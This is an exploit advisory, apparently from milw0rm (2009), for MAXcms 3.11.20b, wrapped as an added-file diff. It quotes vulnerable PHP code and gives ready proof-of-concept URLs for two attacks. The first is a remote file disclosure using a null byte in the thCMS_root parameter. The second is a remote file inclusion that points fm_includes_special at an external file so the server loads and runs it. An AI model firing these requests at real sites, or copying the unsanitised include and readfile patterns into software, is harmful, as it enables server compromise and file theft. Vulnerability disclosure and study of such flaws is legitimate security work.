@@ -1,0 +1,41 @@
+MAXcms 3.11.20b RFI / File Disclosure Vulnerabilities
+I- Remote File Disclosure Vulnerabilities
+In /includes/inc.thcms_admin_dirtree.php (Code)
+22: if ($_GET["getjs"]=="1") {  <<-------!!
+23:    readfile($thCMS_root."/includes/wz_dragdrop.js");<<-------!!
+24:    exit;
+25: }
+POC :
+     http://localhost//microcms/includes/inc.thcms_admin_dirtree.php?getjs=1&thCMS_root=inc.thcms_admin_dirtree.php%00
+                                              #####################
+II- Remote File Inclusion Vulnerabilities
+In /includes/file_manager/special.php (Code)
+01: <?php
+02: /**
+03: *    Hier wird $af_pk übergeben.
+04: *    Das ist die PK aus der Tabelle adovo_filedata auf den einen Datensatz.
+05: */
+06:
+07: include($fm_includes_special); <<-------!!
+08:
+09: ?>
+POC :
+     http://localhost//microcms/includes/file_manager/special.php?fm_includes_special=http://localhost/020.txt
+
+Thanx To
+
+          .___________..______     ____    ____  ___       _______   
+           |           ||   _  \    \   \  /   / /   \     /  _____|  
+           `---|  |----`|  |_)  |    \   \/   / /  ^  \   |  |  __    
+               |  |     |      /      \_    _/ /  /_\  \  |  | |_ |   
+               |  |     |  |\  \----.   |  |  /  _____  \ |  |__| |   
+               |__|     | _| `._____|   |__| /__/     \__\ \______|   
+                                                             
+       ___       ______     ___       _______   _______ .___  ___. ____    ____   
+      /   \     /      |   /   \     |       \ |   ____||   \/   | \   \  /   /   
+     /  ^  \   |  ,----'  /  ^  \    |  .--.  ||  |__   |  \  /  |  \   \/   /    
+    /  /_\  \  |  |      /  /_\  \   |  |  |  ||   __|  |  |\/|  |   \_    _/     
+   /  _____  \ |  `----./  _____  \  |  '--'  ||  |____ |  |  |  |     |  |       
+  /__/     \__\ \______/__/     \__\ |_______/ |_______||__|  |__|     |__|      Tryag.Cc
+
+# milw0rm.com [2009-08-03]
